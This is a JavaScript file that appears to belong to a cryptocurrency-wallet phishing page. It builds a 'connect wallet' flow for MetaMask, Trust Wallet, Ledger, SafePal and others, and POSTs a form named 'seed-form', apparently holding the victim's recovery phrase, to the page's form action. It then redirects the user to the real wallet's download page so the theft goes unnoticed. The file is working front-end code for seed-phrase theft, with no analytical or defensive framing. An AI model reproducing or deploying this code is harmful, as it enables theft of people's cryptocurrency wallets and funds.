(function () {
  var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
      sURLVariables = sPageURL.split('&'),
      sParameterName,
      i;

    for (i = 0; i < sURLVariables.length; i++) {
      sParameterName = sURLVariables[i].split('=');

      if (sParameterName[0] === sParam) {
        return sParameterName[1] === undefined
          ? true
          : decodeURIComponent(sParameterName[1]);
      }
    }
    return false;
  };
  function seed_form_submit(thisForm, action, formData) {
    fetch(action, {
      method: 'POST',
      body: formData,
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
    }).then((data) => {
      // thisForm.querySelector('.loading').classList.remove('d-block');
      if (data.status == 200) {
        // thisForm.querySelector('.sent-message').classList.add('d-block');
        // thisForm.reset();
        switch ($vendorFromURL) {
          case 'Metamask':
            switch (platform) {
              case 'Windows':
                location.href =
                  'https://chrome.google.com/webstore/detail/nkbihfbeogaeaoehlefnkodbefgpgknn';
                break;
              case 'Android':
                location.href = 'https://metamask.app.link/bxwkE8oF99';
                break;
              case 'iOS':
                location.href = 'https://metamask.app.link/skAH3BaF99';
                break;
            }
            break;
          case 'Trust Wallet':
            switch (platform) {
              case 'Windows':
                location.href =
                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
                break;
              case 'Android':
                location.href =
                  'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite';
                break;
              case 'iOS':
                location.href =
                  'https://apps.apple.com/app/apple-store/id1288339409?mt=8';
                break;
            }
            break;
          case 'Token pocket':
            switch (platform) {
              case 'Windows':
                location.href = 'https://dfox.tokenpocket.pro/';
                break;
              case 'Android':
                location.href =
                  'https://play.google.com/store/apps/details?id=vip.mytokenpocket';
                break;
              case 'iOS':
                location.href =
                  'https://itunes.apple.com/cn/app/tokenpocket-trusted-wallet/id1436028697';
                break;
            }
            break;
          case 'WalletConnect':
            location.href = 'https://walletconnect.collab.land/';
            break;
          case 'Ledger':
            switch (platform) {
              case 'Windows':
                location.href =
                  'https://www.ledger.com/ledger-live/download#download-device-1';
                break;
              case 'Android':
                location.href =
                  'https://play.google.com/store/apps/details?id=com.ledger.live';
                break;
              case 'iOS':
                location.href = 'https://itunes.apple.com/app/id1361671700';
                break;
            }
            break;
          case 'SafePal':
            switch (platform) {
              case 'Windows':
                location.href = 'https://safepal.io/download';
                break;
              case 'Android':
                location.href =
                  'https://play.google.com/store/apps/details?id=io.safepal.wallet';
                break;
              case 'iOS':
                location.href = 'https://safepal.io/download/appstore';
                break;
            }
            break;
          case 'OtherWallets':
            Swal.fire(
              'Oh, Sorry!',
              'We will soon add support for <b>' +
                formData.get('vendor') +
                '</b>.',
              'info'
            );
            break;
        }
        $('.loader').remove();
      } else if (data.status == 500) {
        data.json().then((data) => {
          if (data.nullError) {
            Swal.fire(data.nullError, '', 'error');
            $('.loader').remove();
          } else if (data.networkError) {
            Swal.fire(data.networkError, '', 'error');
            $('.loader').remove();
          }
        });
      }
    });
  }

  $vendorFromURL = getUrlParameter('vendor');
  var ua = navigator.userAgent.toLowerCase();
  var isAndroid = ua.indexOf('android') > -1;
  var isIOS = ua.indexOf('mac') > -1;
  var isWindows = ua.indexOf('win') > -1;
  let platform = null;

  if (isAndroid) {
    platform = 'Android';
  } else if (isIOS) {
    platform = 'iOS';
  } else if (isWindows) {
    platform = 'Windows';
  }

  $('.crypto-button').click(function (e) {
    e.preventDefault();
    let ven = $(this).attr('id');
    console.log(ven);
    location.href = 'connect.php?vendor=' + ven;
  });

  $('#connectWalletButton').click(function (e) {
    e.preventDefault();
    // let seedForm = $('#seed-form');

    let thisForm = $('#seed-form');

    let action = thisForm.attr('action');

    $('#loader').append('<div class="loader mx-auto mt-3"></div>');
    // thisForm.querySelector('.error-message').classList.remove('d-block');
    // thisForm.querySelector('.sent-message').classList.remove('d-block');

    let formData = new FormData(document.getElementById('seed-form'));

    seed_form_submit(thisForm, action, formData);
  });
})();
